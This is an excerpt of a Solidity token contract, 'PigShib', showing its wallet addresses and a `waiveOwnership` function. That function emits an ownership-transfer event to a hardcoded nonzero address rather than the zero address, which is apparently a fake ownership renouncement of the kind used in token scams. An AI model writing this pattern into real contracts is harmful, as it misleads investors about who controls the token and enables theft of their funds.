...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xAfff2901725d7d850DD2F3d9e26FeC99670D97DB));
...
contract PigShib is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PigShib";
    string private _symbol = "PIGSHIB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5BC39110976846700b1a3fA18E1Dfe2d9e09Edc3);
    address payable public teamWalletAddress = payable(0x6B1ADcEd24C44465e7a73b5e4AA31D87C2c671A8);
